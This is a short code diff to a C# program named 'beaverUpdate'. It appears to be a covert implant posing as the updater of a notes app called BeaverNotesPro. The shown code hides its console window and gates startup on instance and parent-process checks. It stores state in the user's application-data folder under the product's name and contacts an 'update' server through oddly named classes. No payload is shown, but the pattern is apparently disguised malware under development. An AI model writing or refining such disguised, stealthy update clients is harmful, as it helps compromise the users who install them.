@@ -27,10 +27,10 @@ namespace beaverUpdate
 
         private static DatabaseManager db;
 
-        //[MTAThread]
         static async Task Main(string[] args)
         {
             HideConsoleWindow();
+            
             // protected start: one instance, specific parents
             if (!BetrayalIsASymptom.protectedStart())
             {
@@ -39,7 +39,8 @@ namespace beaverUpdate
             }
 
             // Ensure we're tracking state
-            db = new DatabaseManager("syncstate.db");
+            string buPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\BeaverNotesPro");
+            db = new DatabaseManager(Path.Combine(buPath, "syncstate.db"));
 
             // Connect to the "update" server
             ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();
